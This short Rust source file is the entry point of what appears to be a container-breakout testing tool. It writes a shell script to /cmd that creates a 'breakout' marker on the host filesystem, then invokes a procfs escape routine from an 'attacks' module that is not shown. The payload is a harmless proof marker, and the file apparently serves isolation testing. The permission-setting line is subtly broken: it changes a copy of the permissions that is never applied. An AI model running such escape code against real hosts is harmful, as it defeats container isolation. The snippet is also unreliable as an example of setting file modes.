use std::{io::Write, os::unix::fs::PermissionsExt};

use attacks::procfs::procfs_breakout;

mod attacks;

fn main() -> Result<(), std::io::Error> {
    let args: Vec<String> = std::env::args().collect();
    let host_root = &args[1].trim_end_matches("/");
    println!("Breakout prelude");
    prelude(host_root)?;
    println!("procfs breakout: {:?}", procfs_breakout(host_root));

    Ok(())
}

fn prelude(host_root: &str) -> Result<(), std::io::Error> {
    let mut cmd = std::fs::File::create("/cmd")?;
    cmd.metadata()?.permissions().set_mode(0o777);

    cmd.write_all(
        format!(
            r#"#!/bin/sh
echo "true" > {}/breakout
"#,
            host_root
        )
        .as_bytes(),
    )?;

    Ok(())
}
